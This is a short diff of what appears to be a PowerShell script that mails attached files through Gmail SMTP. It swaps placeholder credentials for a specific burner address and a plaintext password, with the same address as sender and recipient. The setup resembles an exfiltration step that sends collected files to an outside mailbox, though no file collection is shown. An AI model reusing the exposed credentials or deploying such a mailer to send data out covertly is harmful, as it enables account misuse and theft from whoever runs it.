@@ -3,8 +3,8 @@
 #############################################################################
 
 #Connection Details
-$username="throwawaygmailaccountaddress@gmail.com"
-$password="VeryStr0ngP@$$w0rd!"
+$username="burnnercoco@gmail.com"
+$password="Madclowb33!"
 $smtpServer = "smtp.gmail.com"
 $msg = new-object Net.Mail.MailMessage
 
@@ -17,10 +17,10 @@ $smtp.EnableSsl = $true
 $smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)
 
 #From Address
-$msg.From = "throwawaygmailaccountaddress@gmail.com"
+$msg.From = "burnnercoco@gmail.com"
 
 #To Address, Copy the below line for multiple recipients
-$msg.To.Add("throwawaygmailaccountaddress@gmail.com")
+$msg.To.Add("burnnercoco@gmail.com")
 
 #Message Body
 $msg.Body="Please See Attached Files"
